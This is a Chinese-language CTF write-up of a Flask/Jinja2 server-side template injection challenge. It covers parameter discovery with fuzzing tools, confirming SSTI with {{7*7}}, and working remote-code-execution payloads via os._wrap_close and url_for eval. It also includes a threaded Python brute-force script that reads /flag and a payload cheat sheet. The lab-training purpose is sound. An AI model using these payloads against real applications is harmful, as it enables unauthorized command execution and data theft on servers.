## 一句话概括

一道最基础的 Flask SSTI：**参数名未知**需要先探测，注入点确认后，用「遍历子类 + `if` 判名」的模板写法**免去手数索引**，直接找到 `os._wrap_close` 拿命令执行，读 `/flag`。

## 本题情景与解题手法

### 题目形态

打开首页只有一个输入框，提交后页面把 `name` 参数的内容回显出来。**难点在于：页面没有明说参数名是什么**，需要先确定"提交什么参数"。

原笔记的起点问题：**能通过抓包查看能提交的 GET 参数吗？**

### 第一步：找出参数名

抓包只能看到"前端实际发出去的参数"，若页面本身没写死参数名，就要靠探测。常用手段（原笔记整理）：

**① 目录 / 参数扫描工具**

```bash
# 使用 ffuf
ffuf -w wordlist.txt -u "http://靶场地址/FUZZ"

# 使用 dirsearch
dirsearch -u http://靶场地址 -e php

# 使用 arjun（专门探测参数）
arjun -u http://靶场地址/
```

**② 常用参数名字典**

```text
id, page, file, data, cmd, action, func, do, view
user, admin, password, username, email
redirect, url, path, dir, document
callback, json, xml, format
api, key, token, session
```

**③ 查看 JavaScript 文件**

- 浏览器 F12 → Sources → 找 JS 文件
- 搜索 `?`、`&`、`$_GET`、`location.search` 等关键词
- JS 里可能**硬编码了参数名**

**④ 查看 HTML 源码里的线索**

```html
<!-- 注释中可能泄露参数 -->
<!-- 测试用: ?debug=true -->
<a href="page.php?action=delete&id=1">删除</a>
<form action="?submit=1" method="post">
```

本题最终确定的参数名是 **`name`**（`/?name=...`）。

### 第二步：确认存在 SSTI

```http
GET /?name={{7*7}} HTTP/1.1
Host: 靶场地址
```

页面返回 `49` 而不是 `7*7`，说明输入被当模板表达式求值 —— 存在 SSTI。

### 第三步：不用脚本，用模板循环"免索引"利用

子类列表有几百个，手数索引（`[i]`）很痛苦。Jinja2 支持 `{% for %}` 和 `{% if %}`，可以**直接在模板里遍历并筛名字**：

```jinja2
{% for i in ''.__class__.__base__.__subclasses__() %}
  {% if i.__name__ == '_wrap_close' %}
    {% print i.__init__.__globals__['popen']('dir').read() %}
  {% endif %}
{% endfor %}
```

逐段作用（原笔记拆解）：

| 片段 | 作用 |
|---|---|
| `''.__class__` | 取字符串类 `<class 'str'>` |
| `.__base__` | 取父类 `<class 'object'>` |
| `.__subclasses__()` | 取 object 的全部子类列表（遍历所有已加载的类） |
| `i.__name__` | 取当前类名 |
| `'_wrap_close'` | 目标类名，用 `if` 在几百个类里精确命中 |
| `i.__init__` | 取该类的初始化方法 |
| `.__globals__` | 取该方法所在模块的全局命名空间 |
| `['popen']` | 从命名空间里取出 `popen` 函数 |
| `.popen('dir').read()` | 执行命令并读取结果，渲染回页面 |

链条总结（原笔记原话）：

```text
空字符串 → str类 → object基类 → 所有子类 → 找到_wrap_close类
→ 获取它的全局变量 → 拿到os.popen → 执行系统命令 → 输出结果
```

> **为什么选 `_wrap_close`**：它的 `__globals__` 里就引用着 `os` 模块（`popen` 是 os 模块自己定义的函数），这样**不需要逐个遍历去找"哪个类含 os"**，直接精准命中。详见《SSTI获取config与os函数调用》第 5 节。

这条写法相当于**把扫描脚本的逻辑搬进了模板**，一次请求就完成了"找类 + 执行"。

### 第四步：脚本扫描（等价方案）

不想用模板循环时，也可以用脚本并发扫 500 个索引，命中含 `os` 的即利用：

```python
import concurrent.futures
import requests

url = "http://靶场地址/"

def test_index(i):
    p1 = f"{{{{''.__class__.__base__.__subclasses__()[{i}].__init__.__globals__.keys()}}}}"
    p2 = f"{{{{''.__class__.__base__.__subclasses__()[{i}].__init__.__globals__['os'].popen('ls').read()}}}}"
    try:
        r1 = requests.get(f"{url}/?name={p1}", timeout=2)
        if 'os' in r1.text:                       # 该子类的命名空间含 os
            r2 = requests.get(f"{url}/?name={p2}", timeout=2)
            if r2.status_code == 200:             # 命令执行成功
                flag = requests.get(
                    f"{url}/?name="
                    f"{{{{''.__class__.__base__.__subclasses__()[{i}]"
                    f".__init__.__globals__['os'].popen('cat /flag').read()}}}}",
                    timeout=3,
                )
                print(f"索引 {i} 可用，Flag: {flag.text}")
                return True
    except Exception:
        pass
    return False

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    list(ex.map(test_index, range(500)))
```

### 第五步：执行命令拿 flag

命中后，常用的几条命令：

| 命令 | 目的 |
|---|---|
| `ls /` | 查看根目录 |
| `cat /flag` | 直接读取 flag |
| `ls -la` | 查看当前目录详细信息 |
| `find / -name "*flag*" 2>/dev/null` | 全局搜索 flag 文件 |

### 另一种更短的写法：借 `url_for` 的 `eval`

不想爬继承链时，可以直接用 Flask 的 `url_for` 拿 `__builtins__` 里的 `eval`：

```http
GET /?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('tac /f*').read()")}} HTTP/1.1
Host: 靶场地址
```

- `url_for.__globals__` 里带着 `__builtins__`
- 取到 `eval` 后，`eval("__import__('os').popen('tac /f*').read()")` 一票到底
- `tac /f*` 用通配符直接匹配 `/flag`，省去试探路径

### 注入手法一句话总结

> **未知参数名先靠字典 / 扫描工具探出来** → `?name={{7*7}}` 确认注入 → 用模板 `{% for %}` + `{% if i.__name__=='_wrap_close' %}` **免索引**命中 `os._wrap_close` → `__globals__['popen']('cat /flag').read()` 读 flag；嫌绕就用 `url_for.__globals__['__builtins__']['eval']` 直达。

## Payload 速查

| 目的 | Payload |
|---|---|
| 确认 SSTI | `?name={{7*7}}` → `49` |
| 免索引找 `_wrap_close` | `{% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}` |
| 直取 popen 执行 | `''.__class__.__base__.__subclasses__()[i].__init__.__globals__['os'].popen('cat /flag').read()` |
| 借 eval 执行 | `url_for.__globals__['__builtins__']['eval']("__import__('os').popen('tac /f*').read()")` |

## 踩坑与备注

- **参数名不是固定套路**：`?name=` 只是常见形态，本题靠探测确定。用 `arjun` 或参数字典比盲试高效得多。
- **`{% print %}` 才有输出**：Jinja2 里 `{% if %}` 块内的表达式要用 `{% print ... %}` 才会输出，直接写 `{{ ... }}` 在部分写法下不渲染。
- **原笔记说 `_wrap_close` "通常是 `http.client.HTTPResponse`" 是不准确的**：实际它是 **`os._wrap_close`**（os 模块里的内部包装类），正因为属于 os 模块，它的 `__globals__` 才直接带着 `popen`。结论（用它可利用）不受影响，但身份要对上。
- **命令尽量一次到位**：能 `cat /flag` 就别先 `ls` 再 `cat`，每多一次请求就多一次被 WAF 拦的机会；`tac /f*` 是常用的一步到位写法。
- **原题靶场为 `*.challenge.ctf.show` 子域**，属一次性地址，本文统一写作 `靶场地址`。
